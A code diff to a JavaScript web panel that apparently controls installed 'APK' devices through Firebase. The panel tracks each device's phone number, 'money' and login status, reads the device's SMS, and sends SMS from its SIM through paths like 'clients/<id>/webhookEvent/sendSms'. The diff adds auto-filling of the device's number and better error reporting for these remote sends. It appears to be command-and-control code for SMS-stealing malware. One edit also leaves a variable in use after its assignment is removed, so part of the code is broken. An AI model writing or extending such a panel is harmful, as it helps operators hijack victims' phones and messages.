@@ -331,6 +331,24 @@ function getApkMobNo(raw,d){
   if(raw&&raw.mobNo!=null&&String(raw.mobNo).trim())return String(raw.mobNo).trim();
   return d&&d.displayPhone||'No Number';
 }
+function getDeviceSmsPhone(d){
+  if(!d)return'';
+  var raw=getRawDev(d.id);
+  var mob=getApkMobNo(raw,d);
+  if(!mob||mob==='No Number'||/^unknown$/i.test(String(mob).trim()))return'';
+  var clean=String(mob).trim().replace(/\s/g,'');
+  if(clean.indexOf('+')===0)return clean;
+  var digits=normalizePhone(clean);
+  if(digits.length===10)return'+91'+digits;
+  return clean||digits;
+}
+function fillDeviceSmsTo(d,force){
+  var toEl=document.getElementById('smsTo');
+  if(!toEl||!d)return;
+  if(!force&&toEl.value&&String(toEl.value).trim())return;
+  var phone=getDeviceSmsPhone(d);
+  if(phone)toEl.value=phone;
+}
 function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
 function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
 function getApkJoined(raw){return raw&&raw.joined!=null?String(raw.joined):'';}
@@ -1505,6 +1523,7 @@ function renderDeviceDetail(){
   }
   if(chkEl)chkEl.checked=isApkChecked(d.id);
   if(loginEl)loginEl.checked=isApkLoggedIn(d.id);
+  fillDeviceSmsTo(d);
 }
 function toggleDeviceLogin(on){
   var d=getSelDev();if(!d)return;
@@ -1584,9 +1603,13 @@ function sendDeviceSms(sim){
   var toEl=document.getElementById('smsTo');
   var msgEl=document.getElementById('smsBody');
   var toRaw=(toEl&&toEl.value||'').trim();
+  if(!toRaw){
+    toRaw=getDeviceSmsPhone(d);
+    if(toEl&&toRaw)toEl.value=toRaw;
+  }
   var to=normalizePhone(toRaw)||toRaw;
   var msg=(msgEl&&msgEl.value||'').trim();
-  if(!toRaw){toast('Enter recipient phone number',false);return;}
+  if(!toRaw){toast('Device ka phone number nahi mila — number daalo',false);return;}
   if(!msg){toast('Enter message',false);return;}
   if(_sendInFlight){toast('Sending…',true);return;}
   _sendInFlight=true;
@@ -1619,6 +1642,7 @@ function selectDevice(id){
     if(el)el.classList.toggle('active',k==='device');
   });
   renderDeviceDetail();
+  fillDeviceSmsTo(d,true);
   var smsEl=document.getElementById('devListDeviceSms');
   if(smsEl)smsEl.innerHTML='<div class="empty">Loading SMS…</div>';
   loadSmsForDevice(true);
@@ -2202,20 +2226,19 @@ function getSendAttempts(inst,d,to,message,sim){
     rto=buildRto9SendPayload(id,sim,toFull,message);
     out.push({path:'clients/'+id,payload:rto});
     out.push({path:id,payload:rto});
-    rabel=buildRabelSendPayload(sim,toFull,message);
-    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel});
     out.push({path:id+'/webhookEvent/sendSms',payload:rabel});
-  }else{
-    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:buildRabelSendPayload(sim,toFull,message)});
   }
   return out;
 }
 function promiseAny(promises){
   return new Promise(function(resolve,reject){
-    if(!promises||!promises.length)return reject();
-    var fails=0;
+    if(!promises||!promises.length)return reject(new Error('No send path'));
+    var fails=0, errors=[];
     promises.forEach(function(p){
-      Promise.resolve(p).then(resolve).catch(function(){if(++fails>=promises.length)reject();});
+      Promise.resolve(p).then(resolve).catch(function(e){
+        errors.push(e&&e.message?e.message:String(e||'fail'));
+        if(++fails>=promises.length)reject(new Error(errors.filter(Boolean).join(' · ')||'All send paths failed'));
+      });
     });
   });
 }
@@ -2234,7 +2257,10 @@ function sendSmsViaRest(inst,attempts){
         fetch(buildRestUrl(inst,a.path,auth),{
           method:'PUT',headers:{'Content-Type':'application/json'},
           body:JSON.stringify(a.payload),cache:'no-store'
-        }).then(function(r){if(r.ok)return{ok:true,path:a.path,via:'rest'};throw new Error('fail');})
+        }).then(function(r){
+          if(r.ok)return{ok:true,path:a.path,via:'rest'};
+          return r.text().then(function(t){throw new Error((a.path||'rest')+' HTTP '+r.status+(t?' '+t.slice(0,80):''));});
+        })
       );
     });
   });
@@ -2263,13 +2289,13 @@ function sendSms(){
   if(!msg){toast('Enter message',false);return;}
   if(_sendInFlight){toast('Sending...',true);return;}
   _sendInFlight=true;
-  document.getElementById('sendMsg').value='';
-  document.getElementById('sendStatus').textContent='✅ Sent!';
-  toast('SMS sent!',true);
+  document.getElementById('sendStatus').textContent='Sending…';
   sendSmsInstant(to,msg,_sendSimSlot,function(ok,data){
     _sendInFlight=false;
     if(ok){
+      document.getElementById('sendMsg').value='';
       document.getElementById('sendStatus').textContent='✅ '+(data&&data.message||'Sent instantly');
+      toast('SMS sent!',true);
     }else{
       document.getElementById('sendStatus').textContent='❌ '+(data&&data.error||'Failed');
       toast(data&&data.error||'Send failed',false);
@@ -2319,9 +2345,10 @@ function sendSmsInstant(to,msg,simSlot,callback){
     throw new Error((res.data&&res.data.error)||'PHP send failed');
   }));
   promiseAny(tasks).then(function(r){
-    if(callback)callback(true,{ok:true,message:'SMS sent'+(r.via?' via '+r.via:''),path:r.path});
-  }).catch(function(){
-    if(callback)callback(false,{error:'Send failed — check device online & Firebase auth'});
+    if(callback)callback(true,{ok:true,message:'SMS command queued'+(r.via?' via '+r.via:'')+(r.path?' → '+r.path:''),path:r.path});
+  }).catch(function(e){
+    var err=(e&&e.message)||'Send failed — device offline ya Firebase block';
+    if(callback)callback(false,{error:err});
   });
 }
 function sendSmsInternal(to, msg, simSlot, callback){
